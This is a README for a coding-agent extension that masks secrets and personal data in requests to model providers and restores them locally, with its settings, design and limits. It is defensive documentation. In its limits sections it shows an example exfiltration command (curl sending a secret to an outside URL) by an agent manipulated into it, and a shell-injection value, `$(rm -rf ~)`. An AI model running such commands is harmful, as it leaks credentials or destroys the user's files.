# Privacy screen for Pi

An extension for the [Pi coding agent](https://pi.dev) that keeps secrets and
personal data out of what Pi sends to a model provider. Before a request
leaves this machine, private values are replaced by numbered placeholders;
when the reply and its tool calls come back, the values are put in again.

```
you type             Mail lena.fischer@example.com that the token is ghp_x7Kq...9AbCdEf.
the provider gets    Mail <EMAIL_1> that the token is <SECRET_1>.
the model answers    I saved <EMAIL_1> to contact.txt.
you see              I saved lena.fischer@example.com to contact.txt.
contact.txt holds    lena.fischer@example.com
```

Everything stored and shown on this machine is real. Only requests to a
provider are masked. The detection runs locally, in `opf-mlx serve` from this
repository; no text is sent anywhere to be checked.

> [!WARNING]
> **A second line of defence, not a guarantee.** It is for the secret that
> gets pasted by accident, the `.env` a tool happens to read, the customer
> name in a log. It does not make it safe to hand a model what you would not
> hand it otherwise.

## The limits, in short

![What the privacy screen covers, and what gets past it. Requests to the model provider pass the screen and leave masked, except for what the detector misses, images, values that are encoded, hashed or split, names that stand only in the system prompt, and text another extension adds afterwards. Tools run with the real values and send whatever they send. Model calls that another extension makes itself are not screened.](../docs/privacy-screen-limits.svg)

- **It screens model requests, not tools.** Tools are given the real values,
  which is the point, and a command that uploads, pushes or fetches sends
  what it sends. A model that has been talked into
  `curl https://elsewhere/?k=<SECRET_1>` sends the real secret.
- **What the detector misses goes out.** It is a model and a set of patterns.
  How much they miss on your own material has not been measured.
- **A value in another form is another string**: base64, URL-encoded, hashed,
  split over two lines. Images are not looked at.
- **The system prompt is not sent to the detector.** A name that stands only
  in `AGENTS.md` goes out.
- **Other extensions.** A model call that another extension makes itself is
  not screened, nor is text it adds to a request after this one has run.
- **It can hide too much.** A name that is also a word ("Mark", "Rose")
  becomes a placeholder wherever it stands alone.
- **New, and checked only by its own tests**, with Pi 1.6.0, on one machine.
  No one else has reviewed it, and its TypeScript has never been
  type-checked.

[What it does not cover](#what-it-does-not-cover) has the full list, and is
part of what this is.

## Install

It needs an Apple Silicon Mac, Pi 1.6, and this repository with its
environment and checkpoint:

```console
$ git clone https://github.com/ethanolivertroy/privacy-filter-mlx
$ cd privacy-filter-mlx
$ uv sync && uv run opf-mlx download                    # the detector and its 2.8 GB of weights
$ cd pi-privacy-screen
$ ln -s "$PWD" ~/.pi/agent/extensions/privacy-screen    # a link, so the extension finds the detector beside it
```

Pi finds it at its next start and lists it as `privacy-screen`. The footer
then shows `privacy: mask (0 hidden)`: it masks from that first start. To
look first and change nothing, see "A dry run first" below. To try it for one
run without installing, `pi -e /path/to/pi-privacy-screen`. To remove it,
delete the link.

When a session begins, Pi starts the detector if it is not running: one
`opf-mlx serve` process for all Pi sessions, on the Unix socket
`~/.opf/opf-mlx.sock` (only your user can open it, nothing listens on the
network). It loads the model in under a second here, writes its log to
`~/.opf/opf-mlx.sock.log` (never any text it was sent) and exits by itself
after 30 minutes without a request.

## Using it

Nothing has to be done. The footer says what is happening:

| Footer | Meaning |
|---|---|
| `privacy: mask (3 hidden)` | requests are masked; three values have placeholders in this session |
| `privacy: report only (3 found)` | requests go out as they are; this is what would have been hidden |
| `privacy: OFF` | nothing is screened |
| `privacy: local model, not screened` | the model runs on this machine, so nothing leaves it |
| `privacy: DETECTOR DOWN, nothing is sent` | the detector cannot be reached; messages are held back |

| Command | |
|---|---|
| `/privacy` | the state: mode, model, detector, counts, settings file |
| `/privacy mask` \| `report` \| `off` | switch the mode for this session |
| `/privacy list` | the placeholders of this session with a hint of each value; `list full` spells the values out |
| `/privacy reveal <placeholder>` | let the model see one value from now on, also where it stood hidden before |
| `/privacy conceal <placeholder>` | hide it again (what a provider has received stays received) |
| `/privacy retry` | try to reach or start the detector again |

The model cannot look inside a placeholder. It can pass a value along, write
it to a file or use it in a command, but it cannot tell you how long it is or
whether it looks valid. When a task needs that, the model is told to say so,
and you decide: `/privacy reveal <SECRET_1>`. Because replies are shown with
their values put back, the model's "run /privacy reveal ..." reaches you with
the value in place of the placeholder; `reveal` and `conceal` take either.

**A dry run first.** `/privacy report`, or `"mode": "report"` in the settings,
changes nothing in any request and counts what would have been masked;
`/privacy list` shows it.

**When the detector is down** in mask mode, a message is not sent. Its text is
put back in the editor and a notice says why. Pressing Enter again retries
(a start that failed is not repeated for 30 seconds unless you run
`/privacy retry`); `/privacy off` sends without screening.

## Settings

`~/.pi/agent/privacy-screen.json`, all of it optional. Without the file the
screen masks. A setting that is wrong is reported at the start and keeps its
default, so a typing mistake cannot switch the screen off.

```json
{
  "mode": "mask",
  "labels": ["secret", "private_email", "private_phone", "private_person", "private_address", "account_number"],
  "screenLocalModels": false,
  "localProviders": [],
  "envFiles": [".env", ".env.local", ".env.*"],
  "server": { "socket": "~/.opf/opf-mlx.sock", "autoStart": true, "idleExit": 1800, "startTimeout": 60 },
  "shellTools": { "bash": ["command"] },
  "codeTools": ["codemode", "powershell"]
}
```

| Setting | |
|---|---|
| `mode` | `mask`, `report` (look and count, change nothing) or `off` |
| `labels` | what the detector may flag. `private_url` and `private_date` exist and are left out by default: code is full of URLs and dates, and hiding them costs the model more than it protects |
| `screenLocalModels` | screen requests to models on this machine too |
| `localProviders` | provider names to treat as local, besides those whose address is `localhost`, `127.x.x.x` or `[::1]` |
| `envFiles` | file names in the working directory whose secret values are known in advance; `[]` for none |
| `server.socket` | the detector's Unix socket |
| `server.command` | the command that starts it, as a list of arguments. Default: `opf-mlx serve --no-download` from this repository's `.venv`, else from the `PATH` |
| `server.autoStart` | start the detector when it is not running |
| `server.idleExit`, `server.startTimeout` | seconds |
| `shellTools` | for each tool that runs a shell command, the arguments that are commands. Values are quoted for the shell there |
| `codeTools` | tools whose argument is a program that makes tool calls of its own: placeholders in it are left alone, and the calls it makes get their values |

`PI_PRIVACY_SCREEN_CONFIG` names another settings file.

## How it works

![How a request is screened. Pi works on real text. Each request passes the extension, which asks the local detector for private spans, replaces what is found by numbered placeholders, and sends the masked request to the model provider. The reply comes back with placeholders, and the extension puts the values back before Pi stores, shows or runs anything.](../docs/privacy-screen-flow.svg)

1. **Find.** Every text of a request (what you sent, tool results, shell
   output, files) goes to the detector once and is searched for key formats
   that need no model: AWS, GitHub, OpenAI and Anthropic style, Stripe, Slack,
   Google, npm, Hugging Face and GitLab keys, JSON Web Tokens, private key
   blocks, `Bearer` tokens, passwords in URLs, and values assigned to names
   like `PASSWORD` or `API_KEY`. Secret values in the project's `.env` files
   are known before anyone types them.
2. **Replace.** Each distinct value gets one placeholder for the whole
   session, `<EMAIL_1>`, `<SECRET_2>`, ... A value found once is replaced
   wherever it appears afterwards, also where the detector would have missed
   it, in earlier turns too.
3. **Send.** The model is told in its prompt what placeholders are. A last
   look over the finished request replaces known values in the parts that are
   not rewritten text by text, such as tool descriptions.
4. **Put back.** A reply's text and the arguments of its tool calls get their
   values when the reply has arrived, before it is stored, shown or run. In a
   shell command the value is quoted for the place it stands in, so that a
   value like `$(rm -rf ~)` arrives as plain data; where that cannot be done
   with certainty the command is refused, with a reason the model can act on.
5. **Remember.** What the model wrote goes back to the same provider exactly
   as it wrote it, so the conversation it sees stays consistent and cacheable.
   Placeholders and these texts are saved with the session and survive
   `/resume`, `/fork` and `/tree`.

Rules that follow from this:

- **Only the screen makes placeholders.** Text that merely looks like one, in
  a file or pasted, goes out as `<LITERAL_n>` and comes back as the text it
  was. A file that says `<EMAIL_1>` is never given somebody's address.
- **A reply gets values only if its request went out masked.** A model that
  was sent the real text (report mode, off, a local model) can only be quoting
  a placeholder, so its replies are left as written.
- **Closed when in doubt.** With the detector down nothing is sent. A single
  text that cannot be checked is withheld, and the model is told that a text
  is missing. If anything inside the screen fails, the request is stopped.
- **Summaries.** Compaction and branch summaries are made from masked text.
  If that is not possible they are cancelled, not made in the clear.
- **Another model's words are new to this one.** After a model switch, what
  the earlier model wrote is checked like a file before the new provider gets
  it.

[docs/architecture.md](../docs/architecture.md), section 19, has the details.

## What it does not cover

- **What the detector misses.** It is a model and a set of patterns, and both
  miss things. How much it misses on your own material has not been measured
  here.
- **Values in another form.** A secret in base64, URL-encoded, hashed, or
  split over two lines is a different string. Known values are found as they
  are, and as they stand inside a JSON string.
- **Images** and other content that is not text.
- **What tools do.** The screen governs what Pi puts into a model request. A
  command that uploads a file, a `git push`, a tool that fetches a URL send
  what they send. Values are put into tool arguments before a tool runs,
  which is the point, and it means a model that has been talked into
  `curl https://elsewhere/?k=<SECRET_1>` sends the real value. The screen does
  not judge what a tool call does.
- **Model calls that do not go through Pi's agent loop**, such as another
  extension calling a model itself.
- **Text another extension adds afterwards.** Pi runs the hooks of several
  extensions in the order it loaded them, which is the order of the directory
  listing. What another extension puts into a request after this one has run
  is not seen by the detector.
- **The system prompt** (with `AGENTS.md` and the like) is not sent to the
  detector. Known values and key formats are replaced in it; a name that
  appears only there goes out.
- **A provider's own thinking** is never rewritten: it is signed. On screen it
  is shown with values.
- **Models on this machine** are not screened unless `screenLocalModels` is
  set. Only a loopback address counts as this machine.
- **Trust is by provider name.** What a provider wrote goes back to that
  provider unchecked. Behind an aggregator, one name stands for several
  companies.
- **Too much is hidden sometimes.** A name that is also a word ("Mark",
  "Rose") is replaced wherever it stands alone once it has been found, and the
  model then reads a placeholder where a word was meant.
  `/privacy reveal` undoes that for one value.
- **Shells.** Values are quoted for bash, zsh and POSIX sh. A tool that runs
  commands under another name has to be listed in `shellTools`, or it gets
  values unquoted. PowerShell is treated as code: placeholders stay in it.
- **The session file** holds the real conversation, as it always does, and now
  also the table of placeholders. It is no less sensitive than before.
- **Not tried:** setups in which Pi would ask another model than the current
  one for a summary. Branch summaries are covered by unit tests only.
- **Other versions of Pi.** It was written for Pi 1.6.0 and depends on how
  that version's hooks behave. After a Pi update, check that masking still
  happens: paste a made-up key and ask the model how many characters it has.
  A model that was sent a placeholder cannot know.
- **Review.** Nobody but its own tests has checked it. It has had no security
  audit, and it has not been in daily use for any length of time.
- A text over 8 MiB, or one the patterns cannot get through, is withheld
  rather than sent unchecked.
- Clients of Pi's RPC or JSON event stream see placeholders in the partial
  updates of a streaming reply; the finished message has the values.

## What it costs

Measured on an Apple M5 Max, with the detector on the gpu in bfloat16.

- Starting the detector and loading the model: 0.3 to 1 s, once.
- The detector takes 35 to 45 ms for a text of up to 4,000 characters. A
  longer one adds about 6 ms per 1,000 characters: 0.3 s for 50 KB, 0.6 s
  for 100 KB, 6 s for 1 MB. A turn usually adds one to a few texts.
- A text is checked once per session. The conversation a session starts with
  (after `pi -c` or `/resume`) is checked right away, while you are still
  typing, at about 45 ms per message: some 10 s for a long session of 250
  messages. A message sent before that is done waits for the rest of it.
- The screen's own work per request grows with the conversation: about 5 ms
  at 200 KB and 65 ms at 2 MB, most of it the last look over the finished
  request.
- The detector process holds the 2.6 GiB of weights. The model's peak memory
  in the benchmark of this repository is 3.2 to 3.7 GiB for texts up to 2,048
  tokens; the service's own was not measured.

## Tests

```console
$ node --test "test/*.test.ts"    # 177 tests, about 12 s; Node 22.18 or later, no Pi and no model needed
$ node test/e2e/run.ts            # the real pi, the real detector, a pretend provider
$ python3 test/mutations.py       # one deliberate defect at a time; the tests must notice each
```

The unit tests run the shell substitution in the real `bash` (5 and macOS's
3.2), `zsh` and `sh`, with hostile values. The end-to-end run starts `pi` in
RPC mode and in its terminal UI (under `tmux`) with a home and agent directory
of its own, so no setting, session or account of yours is touched, and the
only "model" is a small server on this machine that records what it is sent:
73 checks in eleven scenarios. It needs `pi`, `tmux` and the checkpoint.

The code is TypeScript that Node runs directly. No type check has been run on
it: there is no TypeScript compiler in this environment.

## Layout

```
index.ts          entry point for Pi
src/
  index.ts        the hooks: what happens at which point of a request
  screen.ts       text in, masked text out; what is cached and remembered
  messages.ts     Pi's messages: which texts go out, where replies get values
  vault.ts        the placeholder table       spans.ts     from detector spans to values
  patterns.ts     key formats                 dotenv.ts    values known from .env
  shell.ts        values into shell commands, quoted for where they stand
  detector.ts     the client of opf-mlx serve config.ts    settings
test/             unit tests, e2e/run.ts, mutations.py
```

## License

MIT, like the rest of this repository: see [LICENSE](../LICENSE).
